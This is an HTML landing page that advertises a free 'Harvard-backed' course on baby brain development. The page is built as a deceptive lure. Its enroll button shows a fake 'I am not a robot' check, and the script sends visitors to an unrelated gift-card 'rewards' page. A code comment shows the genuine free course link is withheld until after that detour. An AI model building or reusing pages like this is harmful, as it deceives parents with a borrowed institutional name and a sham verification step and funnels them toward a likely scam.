# babycourse
landing
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Free Harvard-backed Baby Brain Course — Enroll Now</title>
  <meta name="description" content="Free, self-paced, Harvard-backed course on early brain development. Learn research-backed tips to boost your baby's brain — get the free course and certificate." />
  <style>
    :root{--accent:#0b63ce;--accent-dark:#064a9c;--bg:#f7f9fc;--card:#ffffff}
    body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,'Helvetica Neue',Arial;line-height:1.45;background:linear-gradient(180deg,var(--bg),#eef4ff);color:#0b2545}
    .wrap{max-width:920px;margin:32px auto;padding:24px}
    .hero{display:grid;grid-template-columns:1fr 360px;gap:24px;align-items:center}
    .card{background:var(--card);border-radius:14px;padding:26px;box-shadow:0 8px 30px rgba(12,40,80,0.08)}
    h1{margin:0 0 12px;font-size:26px;color:#072042}
    p.lead{margin:0 0 18px;color:#294a6a}
    ul{margin:12px 0 18px;padding-left:18px}
    li{margin:8px 0}
    .cta-btn{display:inline-block;background:var(--accent);color:#fff;padding:12px 18px;border-radius:10px;text-decoration:none;font-weight:600;box-shadow:0 6px 18px rgba(11,99,206,0.18)}
    .cta-btn:hover{background:var(--accent-dark)}
    .badge{display:inline-block;background:#e9f2ff;color:var(--accent);padding:6px 10px;border-radius:999px;font-weight:700;font-size:13px;margin-bottom:12px}

    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:18px}
    .feature{background:#fbfdff;padding:12px;border-radius:10px;border:1px solid #eef6ff;text-align:center}
    .feature h4{margin:8px 0 4px;font-size:15px}
    .feature p{margin:0;font-size:13px;color:#4a6b86}

    footer{margin-top:20px;text-align:center;color:#7690ab;font-size:13px}

    @media (max-width:880px){
      .hero{grid-template-columns:1fr;}
      .features{grid-template-columns:repeat(2,1fr)}
    }
    @media (max-width:520px){
      .features{grid-template-columns:1fr}
    }

    .verification-box {text-align:center;padding:20px;background:#fff;border:1px solid #e0e8f5;border-radius:12px;box-shadow:0 4px 14px rgba(0,0,0,0.06);margin-top:18px}
    .verification-box p {margin-bottom:14px;font-weight:600;color:#072042}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card hero">
      <div>
        <span class="badge">FREE • Harvard-backed</span>
        <h1>Boost Your Baby’s Brain — Simple, Science-Backed Tips You Can Use Today</h1>
        <p class="lead">Short on time? No problem. Learn quick, research-backed ways to support language, memory, focus, and resilience — with no expensive tools required.</p>

        <ul>
          <li>Talk, sing & read regularly — build language and social wiring</li>
          <li>Play and move — every game strengthens neural connections</li>
          <li>Respond to cues — nurture emotional and social development</li>
          <li>Nutrition & sleep — fuel the brain for learning</li>
        </ul>

        <p class="tiny">Want the science behind these tips? Enroll in the free, self-paced Brain Story Certification Course developed with Harvard experts and get a certificate upon completion.</p>

        <p style="margin-top:14px">
          <button class="cta-btn" onclick="showVerification()">Get the Free Harvard-Backed Course →</button>
        </p>

        <div class="features" aria-hidden>
          <div class="feature"><strong>20+ hours</strong><h4>Self-paced modules</h4><p>Move at your speed — learn whenever fits your day.</p></div>
          <div class="feature"><strong>Expert speakers</strong><h4>Neuroscience & practice</h4><p>Lessons from leaders in brain science and child development.</p></div>
          <div class="feature"><strong>Free certificate</strong><h4>Credential on completion</h4><p>Perfect for parents, educators, and caregivers.</p></div>
        </div>
      </div>

      <aside>
        <div style="position:sticky;top:24px">
          <div id="verificationBox" class="verification-box" style="display:none;">
            <p>Your Course Will Be Unlocked After Completion Of A Simple Task</p>
            <button class="cta-btn" onclick="startVerification()">I am not a robot</button>
          </div>
        </div>
      </aside>
    </div>

    <footer>
      <p>Short guide: talk, play, move, respond, sleep — every interaction matters.</p>
    </footer>
  </div>

  <script>
    function showVerification(){
      document.getElementById('verificationBox').style.display = 'block';
    }

    function startVerification(){
      // Step 1: Send to human verification task
      window.location.href = 'https://digitalgiftcard.systeme.io/rewards';
      // After task completion, ideally you'd redirect from that system back to the course:
      // window.location.href = 'https://www.albertafamilywellness.org/training';
    }
  </script>
</body>
</html>
